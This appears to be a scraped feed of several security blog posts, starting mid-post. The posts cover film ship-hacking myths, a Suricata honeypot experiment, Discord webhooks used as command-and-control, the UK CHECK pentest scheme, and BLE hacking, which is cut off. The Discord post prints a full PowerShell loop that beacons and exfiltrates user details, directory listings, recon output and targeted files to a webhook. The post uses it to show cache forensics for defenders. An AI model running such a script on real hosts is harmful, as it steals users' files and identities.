demonstrated.\nHowever, the movie shows opening ballast water doors to accessible deck areas! Ballast tanks would be sealed when at sea. They are only accessed infrequently for inspection and cleaning, through small covers secured with bolts.\nConclusion: plausible as a method of slowing the ship, implausible as a method to flood decks.\n2: Jamming the rudder\nThe character played by Jason Patric attempts to swim under the vessel and wrap a steel cable around the propellor. Now, I’ve had unintentional prop wraps on yachts I’ve sailed, so I know that wrapping things around the propellor causes issues with propulsion!\nBut it simply isn’t necessary in the real world: one would simply take manual control of the steering gear!\nBefore setting sail, every sizeable vessel will carry out a manual steering check. One would access the steering gear room and actuate the hydraulic rams that move the rudder directly. But that’s no fun!\nConclusion: plausible, if pointless\n3: Manually winding the bow thruster\nThe previous two defences were plausible, if pointless. The last one is utterly ridiculous:\nAs the crew has lost control of the helm (ability to steer the ship), as a last resort the Patric character is directed to the bow thruster controls. These, of course, are underwater..\nHe manually winds the bow thruster, causing the ship to change direction and only strikes the oil tanker with a glancing blow.\nProblem 1: a bow thruster on a vessel of this size needs upwards of 1MW of power. Winding a handle manually is going to generate a few Watts of power. So this doesn’t work\nProblem 2: the autopilot has been compromised and is holding a fixed course. It would simply correct any deviation and plough straight into the tanker\nConclusion: totally fanciful\nBringing it up to date\nDoes the movie represent cruise ship security today? Not really. Cruising has become significantly more complex with the advent of always-on internet connectivity and numerous connected systems to drive safety and efficiency.\nIf anything, it’s become somewhat harder to secure cruise ships: they combine propulsion, navigation, and power generation with a hotel, restaurant, casino, and theatre, plus safety and fire control systems. That complexity makes maintaining strict separation between OT and IT a real challenge.\nHowever, most operators are making big leaps forward in securing their vessels. Regulations such as IACS UR E26 &27, together with US Coastguard 33 CFR Part 6 are helping drive behaviours too.\nAs ever, don’t believe everything you see in the movies. Acting aside, Speed 2 does a reasonable job of showing some ship hacking scenes though others are laughable.\nIf you want to learn more about genuine ship security issues, there’s a stream of blog posts on the subject here.", "timestamp": "2025-10-21T13:34:21.387533"}
{"source": "blog", "feed": "https://www.pentestpartners.com/feed/", "title": "Spot trouble early with honeypots and Suricata", "url": "https://www.pentestpartners.com/security-blog/spot-trouble-early-with-honeypots-and-suricata/", "published": "Thu, 02 Oct 2025 09:35:00 +0000", "content": "TL;DR\n- I ran a T-Pot honeypot with Suricata for 3 days, not long, but enough to learn lots.\n- Cloud IPs are heavily abused for scans; CVEs get probed fast.\n- Honeypots are underused, but they don’t have to be. Focus, integration, and purpose make them powerful.\n- I’ll dig deeper into container forensics and targeted setups soon (watch this space for a winter update).\n- Honeypots are growing fast in value and adoption they’re not just bait, they’re smart sensors for modern defence.\nIntroduction\nIt’s strange how satisfying it is to turn off the lights, set up a tent under the stars, and watch the kids swap screen time for mud pies and marshmallows. Before I left for a 3-day family camping trip, I had one last thing to do: set up a T-Pot honeypot safely in a properly isolated DMZ back home.\nWhile we were out in the wild and burning sausages, my honeypot was gathering threat data in the background. That is the great thing about it, if you set it up right, it will work while you don’t. But if you don’t test your setup properly first, you risk leaving a trap for yourself.\nBefore I let T-Pot loose, I made sure to:\n- Contain it fully in a DMZ\n- Check for breakout risks\n- Confirm there was no accidental access to internal hosts.\n- Lock down VLANs and routing paths\nLet’s save the whole “how to lock it down properly” bit for another time, that’s not the fun part right now. But if you’re curious or want to set something like this up yourself (especially for schools or universities), feel free to reach out to the DFIR team here at PTP. We’d be more than happy to help get a honeypot up and running as a hands-on learning tool!\nMy setup\nFor this honeypot experiment, I kept things simple and used a spare laptop I had lying around. It got a fresh start with a clean install of Ubuntu 24.04, just to make sure nothing old or dodgy was hanging around.\nI made sure to enable the firewall (UFW) and set up some basic rules to block any breakout or lateral movement, as I didn’t want the honeypot talking to anything it wasn’t supposed to. Keeping it contained was a priority.\nI also tunnelled my browser traffic through SSH and disabled password authentication.\nOnce that was sorted, I installed T-Pot, which rolled out all the honeypot services I needed in Docker containers. I used Portainer to manage the containers and shipped all logs to an Elasticsearch instance for monitoring. From there, it was just a matter of making sure the box sat safely inside a DMZ and watching the alerts roll in.\nSo, what am I offering to hackers and what is hosted on each container for management ?\nGetting to know Suricata\nOne of the tools I ended up spending the most time with was Suricata. I’d never used it before as my IDS/IPS experience was mostly premium solutions such as Cisco Firepower and Palo Alto, so I went in fresh.\nSuricata is an open-source engine for network threat detection. It analyses traffic in real time to spot attacks, anomalies, and unusual behaviours. The Open Information Security Foundation (OISF) has maintained it since 2009, and both enterprise and research environments widely use it.\nWhat makes it interesting is that instead of guarding a network perimeter, it focuses entirely on the bait, flagging anything from protocol anomalies and brute-force attempts to CVE exploit scans. I used Kibana to help make sense of it all, and the visibility was impressive.\nWhat did it catch?\nAfter leaving it running for three days while I was away, I came back to over 1.4 million alerts, which was a lot of noise and not a lot of cool interesting stuff. I wasn’t generous enough to give the hackers any more time, and I appreciate that only 3 days live is not enough to gain real insights, but I saw a few clear patterns nonetheless:\nThe top traffic sources were Germany, the US, the UK, and Spain (which looked mostly like cloud proxies or compromised servers)\nThere were frequent offenders, including IPs from GitHub, Amazon EC2, and Google Cloud used for automated scanning.\nPlus, a few key CVEs were spotted:\n- CVE-2024-6387 (regreSSHion)\n- CVE-2020-11910 – Attackers are quick to exploit new (and old) vulnerabilities.\nSuricata generates alerts based on rule sets, which are collections of detection rules that define patterns linked to malicious or suspicious traffic. These rules use Suricata’s own syntax and are regularly updated by threat intelligence communities.\nOnce you’ve entered the Suricata container (as shown in the screenshot below), you’ll have access to the full set of Suricata rules under /etc/suricata/rules/.\nThis is where you can:\n- Add custom rules tailored to your environment or honeypot use case\n- Edit existing ones to tweak their behaviour or reduce noise\n- Disable specific rules if they’re too noisy or irrelevant\nEach .rules file corresponds to a protocol or category, like http-events.rules, ssh-events.rules, or stream-events.rules. You can use a text editor like vi or nano (if installed) to make changes. Just be sure to reload or restart Suricata inside the container for any updates to take effect.\nBack to the analysis\nCommon targets included ports 443 and 53, with some oddballs like 15600 thrown in. A few weird payloads appeared too PGP messages, .xz file, probing for upload/download capability\nAny attribution?\nNone of the IPs were flagged as part of major threat groups, but that doesn’t mean they’re safe. Most traffic looked automated, not targeted. Just bots scanning whatever’s out there.\nMy takeaway from analysing this traffic – Cloud IPs: the new playground for attackers\nOne thing that stood out almost immediately was how often cloud-hosted IPs showed up in the logs. Services from Amazon AWS, Google Cloud, and GitHub were among the top offenders used not for direct attacks, but for automated scanning, recon, and exploitation attempts.\nThis isn’t just anecdotal. I looked into the topic a little more, and research by GreyNoise shows a clear upward trend in abuse of cloud infrastructure for opportunistic attacks.\nBlue Team quick wins?\nAs a caveat, the balance of access vs risk should be considered by clients before implementing this change. By default, most firewalls don’t “know” if an IP belongs to AWS, Azure, GCP, etc. They look at IP addresses, ports, protocols, and in some cases deep packet inspection (DPI), but they don’t usually perform real-time WHOIS lookups or ASN (Autonomous System Number) resolution on traffic.\nMost major cloud platforms publish their current IP ranges in machine-readable formats. Therefore, by building a simple rule to detect inbound traffic from known cloud infrastructure, especially when it’s hitting common service ports like 22 (SSH), 80 (HTTP), 443 (HTTPS), or 3389 (RDP), you can flag likely mass-recon and low-level attacks early. WAFs can also help in this area but need to be well thought out to not prevent legitimate traffic.\nA rule outside of the firewall might be better and doesn’t have to be complex. It might check:\n- If the source IP is part of a cloud provider’s published IP range\n- If the destination port is one commonly targeted by automated tools\nIf both conditions are met, you generate an alert for potential scanning or early-stage recon. While it may not be a perfect solution, it effectively filters out a significant amount of noise and provides valuable insight into opportunistic traffic that would otherwise be easy to overlook.\nWrapping up: what I’ve learnt (so far)\nA few days ago, I spoke with a well experienced security lead who has been in the game for years in both offensive and defensive practices, who said something that stuck with me when I asked, “What’s your take on honeypots’ value? What does a meaningful setup and meaningful output look like to you?”\nHis response was: “Well, to start, I can tell you that in 20 years I haven’t had a real need for a honeypot.”\nThat really got me thinking why is that still the case for many security teams? Are honeypots seen as a gimmick? Too niche? Too risky?\nAfter running T-Pot with Suricata in a DMZ for just three days, I can already see how valuable these tools can be when used wisely. But I also get why they’re often underused: many deployments are too broad, unstructured, or treated like novelty traps rather than integrated threat sensors.\nPractical ways to get more from honeypots\n- Use honeypots with intent and tailor them to mimic critical business systems or known attack surfaces, rather than just throwing everything at the wall.\n- Integrate them with threat intelligence tools and enrich IOCs from honeypots with context from platforms like GreyNoise or AbuseIPDB.\n- Automate responses including triggering alerts, blocklists, or isolating segments when specific patterns are observed.\n- Use them to test blue team assumptions: simulate attacks and watch how detection workflows respond in real time.\n- Turn them into learning sandboxes: because they are great for SOC training, malware detonation, or behaviour analysis.\n- Open-source IDS tools like Suricata can help smaller organisations that can’t afford premium services. With a straightforward setup, a local IT provider could have one running in a day.\nWhat’s next?\nI’ll be using Portainer to spin up more targeted container honeypots instead of deploying everything at once. A tighter scope should give me more meaningful data and reduce noise from generic probes.\nThat said, T-Pot and Suricata have already delivered:\n- Some quick wins (like seeing CVEs scanned within 24 hours of disclosure)\n- A better understanding of rule tuning and network visibility\n- A chance to explore some very useful tooling I hadn’t used before and can recommend to clients\nFinal thoughts on honeypot adoption\nThree days was enough to prove the point. The internet is noisy and opportunistic. A focused honeypot turns that noise into useful signal. Done right, it gives defenders a low-cost way to learn, test assumptions, and spot early-stage recon without touching production.\nHowever, it must be deployed safely, in a DMZ with restricted egress. Start narrow for practical value. Emulate one or two services that match your environment. Enrich with ASN and cloud provider tags. Tune Suricata on a regular cadence. Then use the output to update blocklists, write new rules, and train analysts. For students, small teams, and busy blue teams, this is an accessible step towards better visibility.", "timestamp": "2025-10-21T13:34:22.414856"}
{"source": "blog", "feed": "https://www.pentestpartners.com/feed/", "title": "Discord as a C2 and the cached evidence left behind", "url": "https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/", "published": "Tue, 16 Sep 2025 09:21:00 +0000", "content": "TL;DR\n- Discord abused as a lightweight C2 channel for data exfiltration and beaconing\n- What the cache leaves behind, and how we can analyse it\n- Automating Cache Analysis with a CLI parser and a GUI -Based Suite for forensic analysis\nWhy Discord appeals to attackers\nDiscord has become an attractive tool for attackers not because it’s malicious, but because it’s legitimate and trusted. It often flies under the radar of security controls and offers features that make it easy to send data out without user interaction or elevated permissions. We’ve seen similar misuse across other collaboration tools too, like Microsoft Teams and Slack.\nIn this blog post, we’re not looking at memory forensics, network telemetry or host-based logging, instead we’re focusing on the cached artifacts left behind when Discord webhooks are used for C2 and exfiltration.\nRather than spinning up a full bot, we’re keeping it simple, just using webhooks to push data out of a compromised host to a Discord channel. This mirrors what you’d expect to see from your typical script kiddie, no API keys, no elevated perms, just a URL and some PowerShell. The goal here is to show not just how it works, but also what evidence remains in Discord’s local cache, and how defenders can analyse it.\nUsing Discord webhooks for command and control\nA webhook is basically a glorified URL that lets you send messages and files straight to a Discord channel, whatever you send to that URL will show up in the associated channel.\nFor attackers, that’s handy because it’s easy to set up, doesn’t need any special permissions and hides in plain sight. We have set up the webhook in this instance so that it acts as the attackers’ C2 server, where the stolen information from our victim’s machine gets sent to.\nBelow is our sample C2 server, the channel ‘ptp-beacon’ is where all the output from the PowerShell commands will appear.\nPowerShell in action\nBelow are the PowerShell commands that handle script setup, beaconing to the host, file enumeration, reconnaissance, and data exfiltration. Each command is sent to the webhook we set up earlier via PowerShell, which then delivers the results straight into the Discord server:\nScript initialization\n# 1. Discord webhook\n$webhook = \"https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE\"\n# 2. Path to exfiltration target file\n$filePath = \"$env:USERPROFILE\\Documents\\SENSITIVE_FILES_HERE\"\n# 3. Create HTTP client and counter\n$client = New-Object System.Net.Http.HttpClient\n$counter = 0\nBeaconing loop\nwhile ($true) {\n$counter++\n# ─── 1. Beacon ─────────────────────────────────────────────\n$json = '{\"content\":\"━━━━━━━━━━━━━━━━━━\\n:satellite: **Beacon Active**\\n```User: ' + $env:USERNAME + '\\nHost: ' + $env:COMPUTERNAME + '```\"}'\n$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, \"application/json\")\n$content = New-Object System.Net.Http.MultipartFormDataContent\n$content.Add($jsonContent, \"payload_json\")\n$response = $client.PostAsync($webhook, $content).Result\nWrite-Host \"Sent beacon at $(Get-Date): $($response.StatusCode)\"\nFolder listing\n# ─── 2. Folder Listing (every 2nd beacon) ──────────────────\nif ($counter % 2 -eq 0) {\n$userDirs = @(\"Documents\", \"Desktop\", \"Downloads\", \"Pictures\")\n$folderListing = \"\"\nforeach ($dir in $userDirs) {\n$fullPath = Join-Path $env:USERPROFILE $dir\n$files = Get-ChildItem -Path $fullPath -ErrorAction SilentlyContinue | Select-Object -First 2\nif ($files) {\n$folderListing += \"`n$dir:`n\"\n$folderListing += ($files | ForEach-Object { \" - \" + $_.Name }) -join \"`n\"\n}\n}\n$escaped = $folderListing -replace '\"', \"'\" -replace \"`r?`n\", \"\\n\"\n$jsonFolders = '{\"content\":\":file_folder: **User Directories**\\n━━━━━━━━━━━━━━━━━━\\n```' + $escaped + '```\"}'\n$jsonContentFolders = New-Object System.Net.Http.StringContent($jsonFolders, [System.Text.Encoding]::UTF8, \"application/json\")\n$contentFolders = New-Object System.Net.Http.MultipartFormDataContent\n$contentFolders.Add($jsonContentFolders, \"payload_json\")\n$respFolders = $client.PostAsync($webhook, $contentFolders).Result\nWrite-Host \"Uploaded folder listing at $(Get-Date): $($respFolders.StatusCode)\"\n}\nExfiltration of target file\n# ─── 3. Exfil ptp-exfil.jpg (every 3rd beacon) ─────────────\nif ($counter % 3 -eq 0 -and (Test-Path $filePath)) {\n$fileBytes = [System.IO.File]::ReadAllBytes($filePath)\n$fileContent = New-Object System.Net.Http.ByteArrayContent (, $fileBytes)\n$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse(\"application/octet-stream\")\n$jsonExfil = '{\"content\":\":package: **Targeted Exfil ::topsecret**\\n━━━━━━━━━━━━━━━━━━\"}'\n$jsonContentExfil = New-Object System.Net.Http.StringContent($jsonExfil, [System.Text.Encoding]::UTF8, \"application/json\")\n$contentExfil = New-Object System.Net.Http.MultipartFormDataContent\n$contentExfil.Add($jsonContentExfil, \"payload_json\")\n$contentExfil.Add($fileContent, \"file\", \"ptp-exfil.jpg\")\n$respExfil = $client.PostAsync($webhook, $contentExfil).Result\nWrite-Host \"Uploaded ptp-exfil.jpg at $(Get-Date): $($respExfil.StatusCode)\"\n}\nSystem uptime\n# ─── 4. System Uptime (every 4th beacon) ───────────────────\nif ($counter % 4 -eq 0) {\n$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime\n$jsonUptime = '{\"content\":\":stopwatch: **System Uptime**\\n━━━━━━━━━━━━━━━━━━\\n```' + $uptime + '```\"}'\n$jsonContentUptime = New-Object System.Net.Http.StringContent($jsonUptime, [System.Text.Encoding]::UTF8, \"application/json\")\n$contentUptime = New-Object System.Net.Http.MultipartFormDataContent\n$contentUptime.Add($jsonContentUptime, \"payload_json\")\n$respUptime = $client.PostAsync($webhook, $contentUptime).Result\nWrite-Host \"Uploaded uptime at $(Get-Date): $($respUptime.StatusCode)\"\n}\nRecon dump\n# ─── 5. Recon Dump (every 5th beacon) ──────────────────────\nif ($counter % 5 -eq 0) {\n$whoami = whoami\n$ipconfig = ipconfig | Out-String\n$reconFile = \"$env:TEMP\\recon.txt\"\n\"whoami:: $whoami`r`nIPConfig::`r`n$ipconfig\" | Out-File -FilePath $reconFile -Encoding utf8\n$fileBytes = [System.IO.File]::ReadAllBytes($reconFile)\n$fileContent = New-Object System.Net.Http.ByteArrayContent (, $fileBytes)\n$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse(\"text/plain\")\n$jsonRecon = '{\"content\":\":mag: **Recon Data Attached (whoami + ipconfig)**\\n━━━━━━━━━━━━━━━━━━\"}'\n$jsonContentRecon = New-Object System.Net.Http.StringContent($jsonRecon, [System.Text.Encoding]::UTF8, \"application/json\")\n$contentRecon = New-Object System.Net.Http.MultipartFormDataContent\n$contentRecon.Add($jsonContentRecon, \"payload_json\")\n$contentRecon.Add($fileContent, \"file\", \"recon.txt\")\n$respRecon = $client.PostAsync($webhook, $contentRecon).Result\nWrite-Host \"Uploaded recon file at $(Get-Date): $($respRecon.StatusCode)\"\n}\nFurther exfiltration\n# ─── 6. Targeted File: confidential.jpg (every 6th beacon) ─\nif ($counter % 6 -eq 0) {\n$targetFile = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include confidential.jpg -ErrorAction SilentlyContinue | Select-Object -First 1\nif ($targetFile) {\n$fileBytes = [System.IO.File]::ReadAllBytes($targetFile.FullName)\n$fileContent = New-Object System.Net.Http.ByteArrayContent (, $fileBytes)\n$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse(\"application/octet-stream\")\n$jsonTarget = '{\"content\":\":lock: **Targeted Exfil ::confidential.jpg**\\n━━━━━━━━━━━━━━━━━━\"}'\n$jsonContentTarget = New-Object System.Net.Http.StringContent($jsonTarget, [System.Text.Encoding]::UTF8, \"application/json\")\n$contentTarget = New-Object System.Net.Http.MultipartFormDataContent\n$contentTarget.Add($jsonContentTarget, \"payload_json\")\n$contentTarget.Add($fileContent, \"file\", \"confidential.jpg\")\n$respTarget = $client.PostAsync($webhook, $contentTarget).Result\nWrite-Host \"Uploaded confidential.jpg at $(Get-Date): $($respTarget.StatusCode)\"\n} else {\nWrite-Host \"confidential.jpg not found\"\n}\n}\nSleep interval\n# ─── Sleep (tweakable beacon interval) ─────────────────────\nStart-Sleep -Seconds 20\n}\nNow that we’ve shown how simple it is to abuse Discord webhooks, let’s look at what evidence is left behind for investigators.\nTracking attacker activity\nThe below snippet shows PowerShell’s activity log as it pushes the data to the webhook. Each of these lines confirms what was sent and when, so we see regular beaconing to let the attacker know the host is active. It then uploads some data, lists directories, the system uptime and produces a reconnaissance file, followed by the exfiltration of sensitive files such as ‘topsecret.txt’ and ‘confidential.jpg’.\nThe NoContent and OK responses are simply the webhook confirming that Discord has successfully received the data. With the activity logs confirming the traffic, we can now see how this output actually appears inside Discord itself.\nViewing results in Discord\nNow that’s out of the way, let’s have a look at what has been exfiltrated to the # ptp-beacon text channel on Discord:\nLooks like some pretty top-secret stuff! At this point, we’ve successfully grabbed some user details, reviewed their user directories and stolen some of their sensitive files. But now as the attacker, we need to cover our tracks.\n‘Wiping’ the evidence\nNow we’ve exfiltrated the data to our C2 server and taken what we need, let’s clean up our mess. I’ve deleted the Discord server, hopefully the victim will never know!\nWhat Discord’s cache leaves behind\nDeleting a server doesn’t erase everything. Discord’s cache on the victim machine tells a very different story…\nDiscord stores a local cache using Chromium’s Simple Cache format. In plain terms, that means copies of attachments, emoji, webhooks, and even some thumbnails are stored on the disk under:\n%AppData%\\discord\\Cache\\Cache_Data\nInside that directory, you’ll find:\n- index – The Simple Cache index database\n- data_# – Binary cache files, each containing multiple cached objects\n- f_###### – Extracted binary objects (images, attachments, etc.)\nThe key point is persistence, as cached content often persists long after Discord messages or files have been deleted. Their modification timestamps line up with user activity, so investigators can reconstruct exactly when actions took place.\nThe cache structure also makes it possible to match file hashes (SHA256) against threat intelligence feeds to confirm if a known malicious file was used. It also makes it possible to recover webhook URLs and API calls not just from cache, but also from memory.\nAutomating Cache Analysis with a CLI parser and a GUI-Based Suite for forensic analysis\nWhile some open-source tools exist for parsing Chromium caches, we couldn’t find any that were actively maintained or tailored to Discord’s specific artifacts. To address this, we built a Discord forensic suite: a CLI parser and a GUI based suite for forensic analysis.\nBoth tools scan the cache folder recursively and extract Discord-related artifacts, such as webhook URLs, attachments, and cached images.\nDiscord forensic suite: Tool CLI output\nBelow shows an excerpt from the CLI where I have selected my cache directory, provided a title for the report, and chosen where it should be outputted to and in what format. Following on from this, I am able to make decisions on what the report should include; do you want a CSV timeline, do you want to include other cached areas associated with Discord, do you want to enable carving to potentially recover ‘previously existing’ files and is a verbose output required?\nOnce those options are selected, we can then see how many files have been scanned, and where from, where the reports are stored and a breakdown of the artifacts extracted from the cache.\nDiscord forensic suite: Tool GUI output\nThe GUI version provides a clean, user-friendly interface with built-in thumbnail previews of cached images (including emojis, exfiltrated screenshots, and documents). The tool allows users to select the Discord cache folder and then select their required options before parsing the data.\nReporting and recovered evidence\nBelow is a snippet of what the tool uncovered and reported back to us in the case of our PTP C2 Discord server. We can see emojis, API calls, attachments, logos and other information, which allows analysts to filter between artifact types.\nFrom the victim’s perspective, they may be wondering where the images below have derived from, but we know exactly where they’ve come from – that’s the threat actor’s C2 server!\nWe asked the tool to produce a CSV timeline alongside the HTML report, below shows our CSV output for that, I’ve provided a snippet that displayed some images, a video and the reconnaissance text file the threat actor obtained, which is all stored in Discord’s cache, and has now been parsed in time order.\nWe also asked the tool to produce a full CSV report alongside the HTML report and the CSV timeline, below shows a screenshot of those results, displaying some carved files:\nBack to the clickable HTML report. Below shows the exfiltrated ‘confidential’ file, showing the modified date, the file type and source, a preview of the file, the associated hash value and the location in which the file was recovered from.\nThese files are automatically extracted and stored in a media folder.\nSo, even if the threat actor has exfiltrated data from the host and attempted to cover their tracks, by parsing the cache folder, analysts can recover a wealth of forensic evidence, including exfiltrated files, recon outputs, webhook URLs, and API calls, all of which help reconstruct attacker activity.\nConclusion\nDiscord’s legitimacy and ease of use make it an appealing choice for threat actors looking to exfiltrate data or establish lightweight C2 channels without raising alarms. So, as defenders, we should be aware of how this same convenience can also work against them: Discord’s cache preserves a detailed forensic record image, attachments, and webhook interactions, often long after the content has been deleted from the platform.\nDiscord leaves telemetry that can be used by DFIR teams to reconstruct attacker timelines, validate exfiltrated content, and strengthen attribution.\nThat’s why we built DFS (not the sofa company) but the Discord Forensic Suite.\nAnalysts can quickly triage a host, generate a HTML report with hashes and timestamps, and package the findings into an evidence package for review.", "timestamp": "2025-10-21T13:34:23.301301"}
{"source": "blog", "feed": "https://www.pentestpartners.com/feed/", "title": "A buyer’s guide to CHECK in 2025", "url": "https://www.pentestpartners.com/security-blog/a-buyers-guide-to-check-in-2025/", "published": "Wed, 10 Sep 2025 09:28:00 +0000", "content": "TL;DR\n- CHECK is NCSC’s assurance scheme for penetration testing.\n- It has changed. From 2025, CHECK Team Leaders must hold a Principal title with the UK Cyber Security Council, and Team Members must hold a Practitioner title by March 2026.\n- It’s mandatory for government and public-sector systems with classified data, but open to any organisation that wants that level of assurance.\n- NCSC reviews reports and uses anonymised findings to identify national risks.\n- To get value from CHECK, clients should prepare well, support the test, and act on the results.\nWhat is CHECK, when should you use it, and why?\nCHECK is NCSC’s assurance scheme for penetration testing. It began as a way for government and critical systems to be tested safely, but any organisation can use it if they want the same standard.\nCHECK must be used when systems handle information marked OFFICIAL, OFFICIAL-SENSITIVE, SECRET, or TOP SECRET. At SECRET and above, reports stay with you, although NCSC may ask for them later. Outside of government, using CHECK is optional, but it gives confidence that your testing is carried out to the same recognised national standard.\nA CHECK provider gives you testers who are security cleared to work on sensitive systems and follow NCSC’s approved testing method, not just simple scanning. They deliver reports in a format that NCSC reviews and accepts.\nIn short, you use CHECK when you want assurance your test meets the government‑approved standard and is fully trusted.\nWhat‘s new in 2025?\nProfessional titles are now mandatory. Team Leaders (CTLs) must hold a Principal title with the UK Cyber Security Council, and Team Members (CTMs) must hold a Practitioner title by March 2026. Some team leaders will also hold Chartered status, which reflects deeper experience and contribution to the profession.\nWhat do the titles mean for you?\nThe UK Cyber Security Council runs the professional titles system that maps to CHECK roles. A Practitioner title signals proven technical skills and a tester who is building experience.\nA Principal title signals the person who leads the engagement, is accountable for delivery end to end, and owns the final report.\nChartered status sits above both and reflects sustained expertise and wider professional contribution. The shift raises assurance for clients because individuals are accountable to an independent body, not only to their employer.\nPreparing for a CHECK test\nA CHECK test is only as good as the scope. The scheme makes it clear that clients play a part in that too.\nThe scope is the blueprint that decides what we test, why we are testing it, and how deep we go. It should set the business objectives and crown-jewel systems, list in-scope assets and environments, record what is out of scope, and confirm the time window, change freeze, and approvals.\nUnder CHECK, the written scope normally covers both external and internal exposure, with representative vulnerability scanning of endpoints, servers, network devices, and key applications. This uses credentialed scans where possible and a justified sampling approach for large estates.\nYour part is to share a clear picture of the environment, provide test accounts and access, flag operational constraints or special handling, line up people who can answer questions quickly, and secure any third-party permissions. This is especially important for cloud and managed services.\nOur part is to map realistic threats to that picture, propose the right mix of testing, and explain how we will validate findings safely. Part of that is to agree stop conditions, clean-up steps, evidence handling, and document any trade-offs if ideal coverage is not possible.\nWhat to expect in your report\nCHECK reports follow strict rules set out in the CHECK Scheme Standards. Every report must include:\n- An executive summary for senior, non-technical readers.\n- A clear picture of your organisation’s risks.\n- Prioritised findings with recommendations.\n- Neutral, professional language.\nWhere reports go depends on classification:\n- For systems at OFFICIAL or OFFICIAL-SENSITIVE, reports are also submitted to NCSC.\n- For systems at SECRET or TOP SECRET, reports stay with you but may be requested later.\nWhy these matter\nUsing a CHECK provider gives you layers of assurance.\n- Competence: Testers are vetted and hold independent professional titles.\n- Quality: Reports are reviewed by NCSC, who sample and ensure standards are being met.\n- National benefit: Anonymised results help NCSC track vulnerabilities across the UK.\nReports are always confidential. Your organisation is never named publicly.\nConclusion\nCHECK in 2025 has had an overhaul. With Chartership titles for testers, and stronger rules on reporting and methodology, you can be confident a CHECK engagement is delivered to a recognised national standard.\nAssurance is a two-way street. The more prepared you are with scope, access, and the right people, the more value you will get from the test.\nAlso, one final note, a CHECK report is not just for compliance. It is designed to help you understand your risks, plan fixes, and strengthen your security. When used properly, it will help protect your organisation and support greater resilience.", "timestamp": "2025-10-21T13:34:24.158998"}
{"source": "blog", "feed": "https://www.pentestpartners.com/feed/", "title": "Start hacking Bluetooth Low Energy today! (part 3)", "url": "https://www.pentestpartners.com/security-blog/start-hacking-bluetooth-low-energy-today-part-3/", "published": "Thu, 04 Sep 2025 03:40:00 +0000", "content": "TL;DR\n- In the final part we are using my ideal BLE hacking kit! This is one Sniffle dongle and one Nordic dev kit (DK)\n- Nordic dev kits can be used as an alternative to Sniffle.\n- These dev kits can also run a really nice interactive Bluetooth shell\n- You can script interactions with the Nordic shell or write your own RTOS applications as you learn and progress\nIntroduction\nIf you haven’t read the previous posts, I would recommend them as a primer to the devices, BLE and what we’re doing.\nIn part one, we made a low-cost key finder beep by capturing and replaying BLE traffic, covering GATT, handles, and characteristics. In part two, we stepped up the tooling, sniffing traffic with a reflashed Sonoff Zigbee dongle and a Nordic USB dev board, then interacting with characteristics more systematically.\nIn this final part we do the same, with one change… we are going to use a full fat nRF Development Kit instead of the USB dongle. We set it up, capture and inspect traffic, and drive the tag from a simple shell, with notes on pitfalls and safe testing.\nThis dev kit (DK) has an on-board debug probe, so it can be reprogrammed more reliably than our USB dongle because we don’t have to preserve the USB bootloader. This model also lets us load Nordic’s larger example firmwares from the Zephyr project (a Real Time OS) or program it with more advanced custom functionality. We also have additional buttons and LEDs as input/output.\nIf you have the cash, I’d skip the smaller USB DKs from the previous post and buy one of these instead. You can use it with Nordic’s desktop apps the same as in the previous post, so there really isn’t much need for a dongle as well once you have one of these.\nSniffing the traffic\nNow I don’t normally use the Nordic dev kits for my sniffing, I just use Sniffle as per the last post, but it’s *technically* possible, so let’s work through it here for the love of the game.\nAt the time of writing, Nordic supports their sniffing firmware on these dev kits:\n- nRF52840 DK\n- nRF52840 Dongle\n- nRF52833 DK\n- nRF52 DK\n- nRF51 DK\n- nRF51 Dongle\nSo, if you’re going to follow along, you will be stuck with the older NRF52 based boards. This is OK if, like me, you have a spare NRF52 USB dongle (like the one from my last post, so if you mistakenly bought one of them, I guess here’s a good end to it!) that you can dedicate to this. Beware, though, you will lose the USB bootloader and be unable to reprogram without a debug device. If you’re picking up a new full fat dev kit, however, and considering an nRF52 variant because it supports sniffing, I’d caution you – you may find it harder to install more advanced custom firmware down the line vs e.g. the nRF5340 DKs which have more memory etc.\nBasically for sniffing, don’t go too hard getting it working on a Nordic DK when you could just buy a Sonoff dongle and follow the previous post’s instructions!\nAll that said, to get a Nordic dev board sniffing, you’ll need to install the Wireshark capture plugin and profile. Both steps are described here and here at the time of writing. When you’re done, you can open Wireshark and you should see your NRF device as a capture option (this is on Windows, wow!):\nIt’s important here to sniff for a while, ideally before you pair your device, because the Nordic devices seem to struggle to follow channel hopping as well as the Sonoffs. Once you see some advertisements for your target device, you can configure Wireshark to only sniff for that MAC using the Nordic sniffer plugin. This then makes the sniffer much more likely to be able to follow your device connections as it channel hops and identify those GATT writes we need to sniff.\nHere we have selected my specific target device in the plugin banner, and the sniffer follows the connection from my test phone. We can then see the writes when an alarm is set in the mobile app:\nAnd that’s it, the same result, if a little harder to work than the Sniffle. I’m not going to go into much more detail on using the nRF sniffer utility, but it deserves an honourable mention as the only real contender if you must sniff from Windows, an area where Sniffle is lacking.\nIf you skipped this and just used your Sniffle results, that’s how I work 99% of the time when I’m not restricted to Windows devices for some reason.\nIf you couldn’t help but buy that NRF52 dongle in the last post, perhaps making it into a sniffer could be a good end to it?\nControlling the Device With an nRF5340DK\nHere’s the main meat of this post – let’s use the nRF5340DK to control the device! I’ve skipped all the installation of firmware for now (don’t worry, it’s at the end!), suffice it to say I have installed Nordic’s sample ‘Bluetooth shell’ application on the DK, which loads a small RTOS (Zephyr) onto the device. This application gives us a shell we can access on the main MCU USB serial port:\nThis firmware gives us that interactive shell I always wanted for Bluetooth hacking. To get started, you’ll need to initialise the Bluetooth stack (which runs on the DK network core):\nThen we can scan for our device, filtering for its name and setting the RSSI to capture close-by devices only:\nSetting RSSI to -40 will literally only work within an arm’s reach for these tags, which is nice if you have a lot of BLE stuff going on. Now we can connect to that device with a public address:\nFrom there, we can discover the GATT and get all our descriptors and handle mappings, though this step is optional:\nAll that’s left then is to write to our handle:\nAnd it triggers the alarm!\nNow I think that is a lot more familiar and easier to pick up for a lot of hackers vs the GUI method, and it requires a lot less messing about than Blatann, Gattool and Bluetoothctl. You can even script up 